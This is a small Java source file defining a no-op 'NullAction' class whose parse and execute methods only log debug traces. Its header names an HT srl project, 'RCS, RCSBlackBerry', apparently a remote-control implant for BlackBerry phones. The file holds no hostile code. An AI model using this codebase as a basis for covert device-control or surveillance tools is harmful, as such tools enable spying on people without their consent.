//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2012
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.action;

import blackberry.Trigger;
import blackberry.config.ConfAction;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public class NullAction extends SubAction {
    //#ifdef DEBUG
    private static Debug debug = new Debug("NullAction", DebugLevel.VERBOSE);

    //#endif

    public NullAction(ConfAction conf) {
        super(conf);
    }

    protected boolean parse(ConfAction conf) {
        //#ifdef DEBUG
        debug.trace("parse");
        //#endif
        return true;
    }

    public boolean execute(Trigger trigger) {
        //#ifdef DEBUG
        debug.trace("execute");
        //#endif
        return true;
    }

}
